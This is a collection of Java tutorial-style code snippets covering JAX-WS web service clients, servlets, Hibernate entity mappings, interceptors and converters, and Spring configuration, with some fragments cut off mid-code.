        @WebParam(name = "arg0", targetNamespace = "")
        int arg0)
        throws EmployeeNotFound_Exception
    ;

    /**
     * 
     * @param arg1
     * @param arg0
     * @return
     *     returns com.baeldung.jaxws.client.Employee
     * @throws EmployeeNotFound_Exception
     */
    @WebMethod
    @WebResult(targetNamespace = "")
    @RequestWrapper(localName = "updateEmployee", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.UpdateEmployee")
    @ResponseWrapper(localName = "updateEmployeeResponse", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.UpdateEmployeeResponse")
    @Action(input = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/updateEmployeeRequest", output = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/updateEmployeeResponse", fault = {
        @FaultAction(className = EmployeeNotFound_Exception.class, value = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/updateEmployee/Fault/EmployeeNotFound")
    })
    public Employee updateEmployee(
        @WebParam(name = "arg0", targetNamespace = "")
        int arg0,
        @WebParam(name = "arg1", targetNamespace = "")
        String arg1)
        throws EmployeeNotFound_Exception
    ;

    /**
     * 
     * @return
     *     returns java.util.List<com.baeldung.jaxws.client.Employee>
     */
    @WebMethod
    @WebResult(targetNamespace = "")
    @RequestWrapper(localName = "getAllEmployees", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.GetAllEmployees")
    @ResponseWrapper(localName = "getAllEmployeesResponse", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.GetAllEmployeesResponse")
    @Action(input = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/getAllEmployeesRequest", output = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/getAllEmployeesResponse")
    public List<Employee> getAllEmployees();

    /**
     * 
     * @param arg0
     * @return
     *     returns boolean
     * @throws EmployeeNotFound_Exception
     */
    @WebMethod
    @WebResult(targetNamespace = "")
    @RequestWrapper(localName = "deleteEmployee", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.DeleteEmployee")
    @ResponseWrapper(localName = "deleteEmployeeResponse", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.DeleteEmployeeResponse")
    @Action(input = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/deleteEmployeeRequest", output = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/deleteEmployeeResponse", fault = {
        @FaultAction(className = EmployeeNotFound_Exception.class, value = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/deleteEmployee/Fault/EmployeeNotFound")
    })
    public boolean deleteEmployee(
        @WebParam(name = "arg0", targetNamespace = "")
        int arg0)
        throws EmployeeNotFound_Exception
    ;

    /**
     * 
     * @param arg1
     * @param arg0
     * @return
     *     returns com.baeldung.jaxws.client.Employee
     * @throws EmployeeAlreadyExists_Exception
     */
    @WebMethod
    @WebResult(targetNamespace = "")
    @RequestWrapper(localName = "addEmployee", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.AddEmployee")
    @ResponseWrapper(localName = "addEmployeeResponse", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.AddEmployeeResponse")
    @Action(input = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/addEmployeeRequest", output = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/addEmployeeResponse", fault = {
        @FaultAction(className = EmployeeAlreadyExists_Exception.class, value = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/addEmployee/Fault/EmployeeAlreadyExists")
    })
    public Employee addEmployee(
        @WebParam(name = "arg0", targetNamespace = "")
        int arg0,
        @WebParam(name = "arg1", targetNamespace = "")
        String arg1)
        throws EmployeeAlreadyExists_Exception
    ;

    /**
     * 
     * @return
     *     returns int
     */
    @WebMethod
    @WebResult(targetNamespace = "")
    @RequestWrapper(localName = "countEmployees", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.CountEmployees")
    @ResponseWrapper(localName = "countEmployeesResponse", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.CountEmployeesResponse")
    @Action(input = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/countEmployeesRequest", output = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/countEmployeesResponse")
    public int countEmployees();

}
--------------------------------------------------------------------------------------------------------
import javax.xml.ws.WebFault;


/**
 * This class was generated by the JAX-WS RI.
 * JAX-WS RI 2.2.9-b130926.1035
 * Generated source version: 2.2
 * 
 */
@WebFault(name = "EmployeeNotFound", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/")
public class EmployeeNotFound_Exception
    extends Exception
{

    /**
     * Java type that goes as soapenv:Fault detail element.
     * 
     */
    private EmployeeNotFound faultInfo;

    /**
     * 
     * @param faultInfo
     * @param message
     */
    public EmployeeNotFound_Exception(String message, EmployeeNotFound faultInfo) {
        super(message);
        this.faultInfo = faultInfo;
    }

    /**
     * 
     * @param faultInfo
     * @param cause
     * @param message
     */
    public EmployeeNotFound_Exception(String message, EmployeeNotFound faultInfo, Throwable cause) {
        super(message, cause);
        this.faultInfo = faultInfo;
    }

    /**
     * 
     * @return
     *     returns fault bean: com.baeldung.jaxws.client.EmployeeNotFound
     */
    public EmployeeNotFound getFaultInfo() {
        return faultInfo;
    }

}
--------------------------------------------------------------------------------------------------------
import com.baeldung.jaxws.server.repository.EmployeeRepository;

import javax.inject.Inject;
import javax.jws.WebMethod;
import javax.jws.WebService;


@WebService(name = "EmployeeServiceTopDown", targetNamespace = "http://topdown.server.jaxws.baeldung.com/", endpointInterface = "com.baeldung.jaxws.server.topdown.EmployeeServiceTopDown")
public class EmployeeServiceTopDownImpl implements EmployeeServiceTopDown {

    @Inject private EmployeeRepository employeeRepositoryImpl;

    @WebMethod
    public int countEmployees() {
        return employeeRepositoryImpl.count();
    }
}

import javax.jws.WebMethod;
import javax.jws.WebResult;
import javax.jws.WebService;
import javax.jws.soap.SOAPBinding;
import javax.xml.bind.annotation.XmlSeeAlso;


/**
 * This class was generated by the JAX-WS RI.
 * JAX-WS RI 2.2.4-b01
 * Generated source version: 2.2
 * 
 */
@WebService(name = "EmployeeServiceTopDown", targetNamespace = "http://topdown.server.jaxws.baeldung.com/")
@SOAPBinding(parameterStyle = SOAPBinding.ParameterStyle.BARE)
@XmlSeeAlso({
    ObjectFactory.class
})
public interface EmployeeServiceTopDown {


    /**
     * 
     * @return
     *     returns int
     */
    @WebMethod(action = "http://topdown.server.jaxws.baeldung.com/EmployeeServiceTopDown/countEmployees")
    @WebResult(name = "countEmployeesResponse", targetNamespace = "http://topdown.server.jaxws.baeldung.com/", partName = "parameters")
    public int countEmployees();

}
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebInitParam;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(
  name = "BankAccountServlet", 
  description = "Represents a Bank Account and it's transactions", 
  urlPatterns = {"/account", "/bankAccount" }, 
  initParams = { @WebInitParam(name = "type", value = "savings") }
  )
/*@ServletSecurity(
  value = @HttpConstraint(rolesAllowed = {"Member"}),
  httpMethodConstraints = {@HttpMethodConstraint(value = "POST", rolesAllowed = {"Admin"})}
  )*/
public class AccountServlet extends javax.servlet.http.HttpServlet {

    String accountType = null;

    public void init(ServletConfig config) throws ServletException {
        accountType = config.getInitParameter("type");
    }

    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {

        PrintWriter writer = response.getWriter();
        writer.println("<html>Hello, I am an AccountServlet!</html>");
        writer.flush();
    }

    public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
        
        double accountBalance = 1000d;
        String paramDepositAmt = request.getParameter("dep");
        double depositAmt = Double.parseDouble(paramDepositAmt);

        accountBalance = accountBalance + depositAmt;
        
        PrintWriter writer = response.getWriter();
        writer.println("<html> Balance of " + accountType + " account is: " + accountBalance + "</html>");
        writer.flush();
    }
}
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.ServletException;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.Part;

@WebServlet(urlPatterns = { "/uploadCustDocs" })
@MultipartConfig(
  fileSizeThreshold = 1024 * 1024 * 20,
  maxFileSize = 1024 * 1024 * 20,
  maxRequestSize = 1024 * 1024 * 25,
  location = "D:/custDocs"
  )
public class UploadCustomerDocumentsServlet extends HttpServlet {

    protected void doPost(
     HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        for (Part part : request.getParts()) {
            part.write("myFile");
        }
      
        PrintWriter writer = response.getWriter();
        writer.println("<html>File uploaded successfully!</html>");
        writer.flush();
    }

}
--------------------------------------------------------------------------------------------------------
import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;
import javax.servlet.annotation.WebListener;

@WebListener
public class BankAppServletContextListener implements ServletContextListener {

    public void contextInitialized(ServletContextEvent sce) { 
        sce.getServletContext().setAttribute("ATTR_DEFAULT_LANGUAGE", "english"); 
    } 
    
    public void contextDestroyed(ServletContextEvent sce) { 
        System.out.println("CONTEXT DESTROYED"); 
    } 
}
--------------------------------------------------------------------------------------------------------
DefaultKafkaProducerFactory<Integer, String> pf = new DefaultKafkaProducerFactory<>(senderProps);
		KafkaTemplate<Integer, String> template = new KafkaTemplate<>(pf);
		template.setDefaultTopic(topic4);
		template.sendDefault(0, 0, "foo");
		template.flush();
		pf.destroy();
		
		Instant.now().plusMillis(this.replyTimeout)
--------------------------------------------------------------------------------------------------------
import org.immutables.value.Value;

@Value.Immutable
public abstract class Person {
    abstract String getName();
    abstract Integer getAge();
}
import org.immutables.value.Value;

@Value.Immutable(prehash = true)
public abstract class Person {
    abstract String getName();
    abstract Integer getAge();
}
import org.immutables.value.Value;

@Value.Immutable
public abstract class Person {

    @Value.Parameter
    abstract String getName();

    @Value.Parameter
    abstract Integer getAge();
}
import org.immutables.value.Value;

@Value.Immutable(prehash = true)
public abstract class Person {

    abstract String getName();

    @Value.Default
    Integer getAge() {
        return 42;
    }
}
import org.immutables.value.Value;

@Value.Immutable
public abstract class Person {
    abstract String getName();
    abstract Integer getAge();

    @Value.Auxiliary
    abstract String getAuxiliaryField();
}

--------------------------------------------------------------------------------------------------------
application/vnd.spring-boot.actuator.v2+json;charset=UTF-8
--------------------------------------------------------------------------------------------------------
@AnyMetaDef(name = "EntityDescriptionMetaDef", metaType = "string", idType = "int",
        metaValues = {
                @MetaValue(value = "Employee", targetEntity = Employee.class),
                @MetaValue(value = "Phone", targetEntity = Phone.class)
        })
package com.baeldung.hibernate.pojo;

import org.hibernate.annotations.AnyMetaDef;
import org.hibernate.annotations.MetaValue;

    @Id
    @GeneratedValue(generator = "prod-generator")
    @GenericGenerator(name = "prod-generator", parameters = @Parameter(name = "prefix", value = "prod"), strategy = "com.baeldung.hibernate.pojo.generator.MyGenerator")
    private String prodId;
--------------------------------------------------------------------------------------------------------
import org.hibernate.annotations.*;

import javax.persistence.Entity;
import javax.persistence.*;
import java.io.Serializable;
import java.util.HashSet;
import java.util.Set;

@Entity
@Where(clause = "deleted = false")
@FilterDef(name = "incomeLevelFilter", parameters = @ParamDef(name = "incomeLimit", type = "int"))
@Filter(name = "incomeLevelFilter", condition = "grossIncome > :incomeLimit")
public class Employee implements Serializable {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Integer id;

    private long grossIncome;

    private int taxInPercents;

    private boolean deleted;

    public long getTaxJavaWay() {
        return grossIncome * taxInPercents / 100;
    }

    @Formula("grossIncome * taxInPercents / 100")
    private long tax;

    @OneToMany
    @JoinColumn(name = "employee_id")
    @Where(clause = "deleted = false")
    private Set<Phone> phones = new HashSet<>(0);

    public Employee() {
    }

    public Employee(long grossIncome, int taxInPercents) {
        this.grossIncome = grossIncome;
        this.taxInPercents = taxInPercents;
    }

    public Integer getId() {
        return id;
    }

    public long getGrossIncome() {
        return grossIncome;
    }

    public int getTaxInPercents() {
        return taxInPercents;
    }

    public long getTax() {
        return tax;
    }

    public void setId(Integer id) {
        this.id = id;
    }

    public void setGrossIncome(long grossIncome) {
        this.grossIncome = grossIncome;
    }

    public void setTaxInPercents(int taxInPercents) {
        this.taxInPercents = taxInPercents;
    }

    public boolean getDeleted() {
        return deleted;
    }

    public void setDeleted(boolean deleted) {
        this.deleted = deleted;
    }

    public Set<Phone> getPhones() {
        return phones;
    }
}
--------------------------------------------------------------------------------------------------------
import javax.persistence.DiscriminatorColumn;
import javax.persistence.DiscriminatorType;
import javax.persistence.Entity;
import javax.persistence.Id;
import javax.persistence.Inheritance;
import javax.persistence.InheritanceType;

import org.hibernate.annotations.DiscriminatorFormula;

@Entity
@Inheritance(strategy = InheritanceType.SINGLE_TABLE)
@DiscriminatorColumn(name = "product_type", discriminatorType = DiscriminatorType.INTEGER)
// @DiscriminatorFormula("case when author is not null then 1 else 2 end")
public class MyProduct {
    @Id
    private long productId;

    private String name;

    public MyProduct() {
    }

    public MyProduct(long productId, String name) {
        super();
        this.productId = productId;
        this.name = name;
    }

    public long getProductId() {
        return productId;
    }

    public void setProductId(long productId) {
        this.productId = productId;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

}
--------------------------------------------------------------------------------------------------------
import javax.persistence.DiscriminatorValue;
import javax.persistence.Entity;

@Entity
@DiscriminatorValue("1")
public class Book extends MyProduct {
    private String author;

    public Book() {
    }

    public Book(long productId, String name, String author) {
        super(productId, name);
        this.author = author;
    }

    public String getAuthor() {
        return author;
    }

    public void setAuthor(String author) {
        this.author = author;
    }

}
--------------------------------------------------------------------------------------------------------
mport javax.persistence.Entity;
import javax.persistence.Id;

import org.hibernate.annotations.Polymorphism;
import org.hibernate.annotations.PolymorphismType;

@Entity
@Polymorphism(type = PolymorphismType.EXPLICIT)
public class Bag implements Item {

    @Id
    private long bagId;

    private String type;

    public Bag(long bagId, String type) {
        this.bagId = bagId;
        this.type = type;
    }

    public long getBagId() {
        return bagId;
    }

    public void setBagId(long bagId) {
        this.bagId = bagId;
    }

    public String getType() {
        return type;
    }

    public void setType(String type) {
        this.type = type;
    }
}
--------------------------------------------------------------------------------------------------------
import java.io.Serializable;
import java.util.Properties;
import java.util.stream.Stream;

import org.hibernate.HibernateException;
import org.hibernate.MappingException;
import org.hibernate.engine.spi.SharedSessionContractImplementor;
import org.hibernate.id.Configurable;
import org.hibernate.id.IdentifierGenerator;
import org.hibernate.service.ServiceRegistry;
import org.hibernate.type.Type;

public class MyGenerator implements IdentifierGenerator, Configurable {

    private String prefix;

    @Override
    public Serializable generate(SharedSessionContractImplementor session, Object obj) throws HibernateException {

        String query = String.format("select %s from %s", 
            session.getEntityPersister(obj.getClass().getName(), obj).getIdentifierPropertyName(),
            obj.getClass().getSimpleName());

        Stream<String> ids = session.createQuery(query).stream();

        Long max = ids.map(o -> o.replace(prefix + "-", ""))
            .mapToLong(Long::parseLong)
            .max()
            .orElse(0L);

        return prefix + "-" + (max + 1);
    }

    @Override
    public void configure(Type type, Properties properties, ServiceRegistry serviceRegistry) throws MappingException {
        prefix = properties.getProperty("prefix");
    }

}
--------------------------------------------------------------------------------------------------------
import java.io.Serializable;
import java.util.Date;

import org.hibernate.EmptyInterceptor;
import org.hibernate.type.Type;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.baeldung.hibernate.interceptors.entity.User;

public class CustomInterceptor extends EmptyInterceptor {
    private static final Logger logger = LoggerFactory.getLogger(CustomInterceptor.class);

    @Override
    public boolean onSave(Object entity, Serializable id, Object[] state, String[] propertyNames, Type[] types) {
        if (entity instanceof User) {
            logger.info(((User) entity).toString());
        }
        return super.onSave(entity, id, state, propertyNames, types);
    }
    
    @Override
    public boolean onFlushDirty(Object entity, Serializable id, Object[] currentState, Object [] previousState, String[] propertyNames, Type[] types) {
        if (entity instanceof User) {
            ((User) entity).setLastModified(new Date());
            logger.info(((User) entity).toString());
        }
        return super.onFlushDirty(entity, id, currentState, previousState, propertyNames, types);
    }
}
--------------------------------------------------------------------------------------------------------
import java.io.Serializable;
import java.util.Iterator;

import org.hibernate.CallbackException;
import org.hibernate.EntityMode;
import org.hibernate.Interceptor;
import org.hibernate.Transaction;
import org.hibernate.type.Type;

public class CustomInterceptorImpl implements Interceptor, Serializable {

    @Override
    public boolean onLoad(Object entity, Serializable id, Object[] state, String[] propertyNames, Type[] types) throws CallbackException {
        // TODO Auto-generated method stub
        return false;
    }

    @Override
    public boolean onFlushDirty(Object entity, Serializable id, Object[] currentState, Object[] previousState, String[] propertyNames, Type[] types) throws CallbackException {
        // TODO Auto-generated method stub
        return false;
    }

    @Override
    public boolean onSave(Object entity, Serializable id, Object[] state, String[] propertyNames, Type[] types) throws CallbackException {
        // TODO Auto-generated method stub
        return false;
    }

    @Override
    public void onDelete(Object entity, Serializable id, Object[] state, String[] propertyNames, Type[] types) throws CallbackException {
        // TODO Auto-generated method stub

    }

    @Override
    public void onCollectionRecreate(Object collection, Serializable key) throws CallbackException {
        // TODO Auto-generated method stub

    }

    @Override
    public void onCollectionRemove(Object collection, Serializable key) throws CallbackException {
        // TODO Auto-generated method stub

    }

    @Override
    public void onCollectionUpdate(Object collection, Serializable key) throws CallbackException {
        // TODO Auto-generated method stub

    }

    @Override
    public void preFlush(Iterator entities) throws CallbackException {
        // TODO Auto-generated method stub

    }

    @Override
    public void postFlush(Iterator entities) throws CallbackException {
        // TODO Auto-generated method stub

    }

    @Override
    public Boolean isTransient(Object entity) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public int[] findDirty(Object entity, Serializable id, Object[] currentState, Object[] previousState, String[] propertyNames, Type[] types) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public Object instantiate(String entityName, EntityMode entityMode, Serializable id) throws CallbackException {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public String getEntityName(Object object) throws CallbackException {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public Object getEntity(String entityName, Serializable id) throws CallbackException {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void afterTransactionBegin(Transaction tx) {
        // TODO Auto-generated method stub

    }

    @Override
    public void beforeTransactionCompletion(Transaction tx) {
        // TODO Auto-generated method stub

    }

    @Override
    public void afterTransactionCompletion(Transaction tx) {
        // TODO Auto-generated method stub

    }

    @Override
    public String onPrepareStatement(String sql) {
        // TODO Auto-generated method stub
        return null;
    }

}
--------------------------------------------------------------------------------------------------------
	@Column(name = "name", columnDefinition="VARCHAR(128)") 
	private String name; 
	 
	@Lob 
	@Column(name = "photo", columnDefinition="BLOB") 
	private byte[] photo;
--------------------------------------------------------------------------------------------------------
import javax.persistence.AttributeConverter;
import javax.persistence.Converter;

import com.baeldung.hibernate.pojo.PersonName;

@Converter
public class PersonNameConverter implements AttributeConverter<PersonName, String> {

    private static final String SEPARATOR = ", ";

    @Override
    public String convertToDatabaseColumn(PersonName personName) {
        if (personName == null) {
            return null;
        }

        StringBuilder sb = new StringBuilder();
        if (personName.getSurname() != null && !personName.getSurname()
            .isEmpty()) {
            sb.append(personName.getSurname());
            sb.append(SEPARATOR);
        }

        if (personName.getName() != null && !personName.getName()
            .isEmpty()) {
            sb.append(personName.getName());
        }

        return sb.toString();
    }

    @Override
    public PersonName convertToEntityAttribute(String dbPersonName) {
        if (dbPersonName == null || dbPersonName.isEmpty()) {
            return null;
        }

        String[] pieces = dbPersonName.split(SEPARATOR);

        if (pieces == null || pieces.length == 0) {
            return null;
        }

        PersonName personName = new PersonName();        
        String firstPiece = !pieces[0].isEmpty() ? pieces[0] : null;
        if (dbPersonName.contains(SEPARATOR)) {
            personName.setSurname(firstPiece);

            if (pieces.length >= 2 && pieces[1] != null && !pieces[1].isEmpty()) {
                personName.setName(pieces[1]);
            }
        } else {
            personName.setName(firstPiece);
        }

        return personName;
    }
}
--------------------------------------------------------------------------------------------------------
//package com.paragon.microservices.distributor.configuration;
//
//import lombok.RequiredArgsConstructor;
//import org.springframework.beans.factory.config.BeanPostProcessor;
//import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
//import org.springframework.boot.autoconfigure.condition.SearchStrategy;
//import org.springframework.boot.autoconfigure.jmx.ParentAwareNamingStrategy;
//import org.springframework.boot.autoconfigure.orm.jpa.JpaProperties;
//import org.springframework.context.annotation.Bean;
//import org.springframework.context.annotation.Configuration;
//import org.springframework.context.annotation.Description;
//import org.springframework.context.annotation.Primary;
//import org.springframework.dao.annotation.PersistenceExceptionTranslationPostProcessor;
//import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
//import org.springframework.jmx.export.annotation.AnnotationJmxAttributeSource;
//import org.springframework.jmx.export.naming.ObjectNamingStrategy;
//import org.springframework.orm.hibernate5.LocalSessionFactoryBean;
//import org.springframework.orm.jpa.JpaDialect;
//import org.springframework.orm.jpa.JpaTransactionManager;
//import org.springframework.orm.jpa.JpaVendorAdapter;
//import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
//import org.springframework.orm.jpa.persistenceunit.DefaultPersistenceUnitManager;
//import org.springframework.orm.jpa.persistenceunit.PersistenceUnitManager;
//import org.springframework.orm.jpa.support.PersistenceAnnotationBeanPostProcessor;
//import org.springframework.orm.jpa.vendor.HibernateJpaDialect;
//import org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter;
//import org.springframework.transaction.PlatformTransactionManager;
//import org.springframework.transaction.annotation.EnableTransactionManagement;
//import org.springframework.transaction.support.TransactionTemplate;
//
//import javax.sql.DataSource;
//import java.io.IOException;
//import java.util.Properties;
//import java.util.UUID;
//
//import static org.apache.commons.lang3.StringUtils.join;
//
//@Configuration
//@RequiredArgsConstructor
//@EnableTransactionManagement
//@EnableJpaRepositories
////        (
////        basePackages = {
////                "com.paragon.microservices.distributor.model",
////                "com.paragon.microservices.distributor.repository"
////        }
////)
//@Description("Paragon MicroServices Distributor datasource configuration")
//public class DataSourceConfiguration {
//
//    /**
//     * Default persistence unit name
//     */
//    public static final String DEFAULT_PERSISTENCE_UNIT_NAME = "local";
//    /**
//     * Default domain name prefix
//     */
//    public static final String DEFAULT_DOMAIN_NAME_PREFIX = "domain-";
//
//    @Bean
//    @Primary
//    @ConditionalOnMissingBean(name = {"entityManagerFactory"})
//    @Description("Local container entity manager factory bean")
//    public LocalContainerEntityManagerFactoryBean entityManagerFactory(final DataSource dataSource, final JpaProperties jpaProperties) {
//        final LocalContainerEntityManagerFactoryBean factoryBean = new LocalContainerEntityManagerFactoryBean();
//        factoryBean.setDataSource(dataSource);
//        factoryBean.setJpaVendorAdapter(this.jpaVendorAdapter());
//        factoryBean.setJpaPropertyMap(jpaProperties.getProperties());
//        factoryBean.setJpaDialect(this.jpaDialect());
//        factoryBean.setPackagesToScan(this.getPackagesToScan());
//        factoryBean.setPersistenceUnitName(DEFAULT_PERSISTENCE_UNIT_NAME);
//        return factoryBean;
//    }
//
//    /**
//     * Returns {@link JpaVendorAdapter} configuration
//     *
//     * @return {@link JpaVendorAdapter} configuration
//     */
//    @Bean
//    @ConditionalOnMissingBean
//    public JpaVendorAdapter jpaVendorAdapter() {
//        return new HibernateJpaVendorAdapter();
//    }
//
//    @Bean
//    @ConditionalOnMissingBean(type = "JpaTransactionManager")
//    @Description("JPA transaction manager bean")
//    public JpaTransactionManager transactionManager(final LocalContainerEntityManagerFactoryBean entityManagerFactory) {
//        final JpaTransactionManager transactionManager = new JpaTransactionManager();
//        transactionManager.setEntityManagerFactory(entityManagerFactory.getObject());
//        return transactionManager;
//    }
//
////    @Bean(name = "transactionManager")
////    public HibernateTransactionManager transactionManager(final DataSource dataSource) {
////        final HibernateTransactionManager txManager = new HibernateTransactionManager();
////        txManager.setSessionFactory(this.sessionFactory(dataSource).getObject());
////        return txManager;
////    }
//
//    @Bean
//    @Primary
//    @Description("Transaction template bean")
//    public TransactionTemplate transactionTemplate(final PlatformTransactionManager transactionManager) {
//        return new TransactionTemplate(transactionManager);
//    }
//
//    /**
//     * Returns {@link ParentAwareNamingStrategy} configuration
//     *
//     * @return {@link ParentAwareNamingStrategy} configuration
//     */
//    @Bean
//    @ConditionalOnMissingBean(value = ObjectNamingStrategy.class, search = SearchStrategy.CURRENT)
//    @Description("Parent aware object naming strategy bean")
//    public ParentAwareNamingStrategy objectNamingStrategy() {
//        final ParentAwareNamingStrategy namingStrategy = new ParentAwareNamingStrategy(new AnnotationJmxAttributeSource());
//        namingStrategy.setDefaultDomain(join(DEFAULT_DOMAIN_NAME_PREFIX, UUID.randomUUID().toString()));
//        return namingStrategy;
//    }
//
//    /**
//     * Returns {@link JpaDialect} configuration
//     *
//     * @return {@link JpaDialect} configuration
//     */
//    @Bean
//    @Description("JPA dialect bean")
//    public JpaDialect jpaDialect() {
//        return new HibernateJpaDialect();
//    }
//
//    /**
//     * Returns {@link PersistenceExceptionTranslationPostProcessor} configuration
//     *
//     * @return {@link PersistenceExceptionTranslationPostProcessor} configuration
//     */
//    @Bean
//    @Description("Persistence exception translation post processor bean")
//    public PersistenceExceptionTranslationPostProcessor exceptionTranslation() {
//        return new PersistenceExceptionTranslationPostProcessor();
//    }
//
//    /**
//     * Returns {@link PersistenceUnitManager} configuration
//     *
//     * @return {@link PersistenceUnitManager} configuration
//     */
//    @Bean
//    @Description("Persistence unit manager bean")
//    public PersistenceUnitManager persistenceUnitManager(final DataSource dataSource) {
//        final DefaultPersistenceUnitManager manager = new DefaultPersistenceUnitManager();
//        manager.setDefaultDataSource(dataSource);
//        manager.setDefaultPersistenceUnitName(DEFAULT_PERSISTENCE_UNIT_NAME);
//        return manager;
//    }
//
//    /**
//     * Returns {@link BeanPostProcessor} configuration
//     *
//     * @return {@link BeanPostProcessor} configuration
//     */
//    @Bean
//    @Description("Post processor bean")
//    public BeanPostProcessor postProcessor() {
//        final PersistenceAnnotationBeanPostProcessor postProcessor = new PersistenceAnnotationBeanPostProcessor();
//        postProcessor.setDefaultPersistenceUnitName(DEFAULT_PERSISTENCE_UNIT_NAME);
//        return postProcessor;
//    }
//
//    /**
//     * Returns {@link LocalSessionFactoryBean} configuration
//     *
//     * @return {@link LocalSessionFactoryBean} configuration
//     */
//    @Bean
//    @Description("Local session factory bean")
//    public LocalSessionFactoryBean sessionFactory(final DataSource dataSource, final JpaProperties jpaProperties) throws IOException {
//        final LocalSessionFactoryBean sessionFactory = new LocalSessionFactoryBean();
//        sessionFactory.setDataSource(dataSource);
//        //sessionFactory.setPackagesToScan(this.getPackagesToScan());
//
//        final Properties properties = new Properties();
//        properties.putAll(jpaProperties.getProperties());
//        sessionFactory.setHibernateProperties(properties);
//        sessionFactory.afterPropertiesSet();
//        return sessionFactory;
//    }
//
//    protected String[] getPackagesToScan() {
//        return new String[]{"com.paragon.microservices.distributor.model", "com.paragon.microservices.distributor.model"};
//    }
//}
{"userId":"ee9cb324-1781-4bb6-6131-08d727c2cbb2","ownerId":"b3a341c7-43d0-41b9-af35-cb4cf3b13476"}
{"userId": "ee9cb324-1781-4bb6-6131-08d727c2cbb2","ownerId": "b3a341c7-43d0-41b9-af35-cb4cf3b13476"}
--------------------------------------------------------------------------------------------------------
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.MappedSuperclass;

import com.fasterxml.jackson.annotation.JsonIgnore;

import org.hibernate.annotations.ColumnDefault;
import org.hibernate.annotations.CreationTimestamp;
import org.hibernate.annotations.UpdateTimestamp;

import lombok.Getter;
import lombok.Setter;

@MappedSuperclass
@Getter @Setter
public class BaseEntity {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    protected Integer id;

    @CreationTimestamp
    @ColumnDefault("CURRENT_TIMESTAMP")
    protected Date createdAt;

    @UpdateTimestamp
    @ColumnDefault("CURRENT_TIMESTAMP")
    protected Date updatedAt;
}

CREATE TABLE my_table (
        ...
      updated_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
    );
--------------------------------------------------------------------------------------------------------
import java.net.InetAddress;
import java.net.UnknownHostException;
 
public class MyLocalHostName {
    public static void main(String a[]){
        try {
            InetAddress myHost = InetAddress.getLocalHost();
            System.out.println(myHost.getHostName());
        } catch (UnknownHostException ex) {
            ex.printStackTrace();
        }
    }
}

https://knative.dev/v0.4-docs/serving/samples/hello-world/helloworld-java/
https://www.springboottutorial.com/spring-boot-with-embedded-servers-tomcat-jetty
https://o7planning.org/ru/11669/spring-boot
https://www.javatpoint.com/spring-boot-properties
https://o7planning.org/ru/11665/spring-boot-hibernate-and-spring-transaction-tutorial
--------------------------------------------------------------------------------------------------------
import org.apache.commons.validator.routines.EmailValidator;
import org.o7planning.sbshoppingcart.form.CustomerForm;
import org.springframework.stereotype.Component;
import org.springframework.validation.Errors;
import org.springframework.validation.ValidationUtils;
import org.springframework.validation.Validator;
 
@Component
public class CustomerFormValidator implements Validator {
 
   private EmailValidator emailValidator = EmailValidator.getInstance();
 
   // This validator only checks for the CustomerForm.
   @Override
   public boolean supports(Class<?> clazz) {
      return clazz == CustomerForm.class;
   }
 
   @Override
   public void validate(Object target, Errors errors) {
      CustomerForm custInfo = (CustomerForm) target;
 
      // Check the fields of CustomerForm.
      ValidationUtils.rejectIfEmptyOrWhitespace(errors, "name", "NotEmpty.customerForm.name");
